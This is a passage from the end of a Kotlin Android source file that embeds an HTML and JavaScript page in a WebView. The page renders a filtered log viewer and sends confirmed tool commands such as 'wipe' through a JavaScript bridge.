                                .replace(/\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}[^\s]*/g, '<span class="time">$&</span>');
                            html += '<div class="log-entry">' + highlighted + '</div>';
                        });
                    }
                    document.getElementById('logContainer').innerHTML = html;
                    document.getElementById('totalCount').textContent = allLogs.length;
                    document.getElementById('shownCount').textContent = filteredLogs.length;
                }

                // --- TOOLS LOGIC ---
                function confirmCmd(cmd, msg) {
                    Android.vibrate(30);
                    if (confirm(msg)) {
                        Android.vibrate(100);
                        var success = Android.sendCommand(cmd);
                        if (success) {
                            alert("Command sent successfully.");
                            if (cmd === 'wipe' || cmd === 'nuke') {
                                allLogs = [];
                                filterLogs('');
                            }
                            if (typeof Android.refreshStatus === 'function') {
                                Android.refreshStatus();
                            }
                        } else {
                            alert("Failed to send command.");
                        }
                    }
                }
            </script>
        </body>
        </html>
        """.trimIndent()
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
    }
}
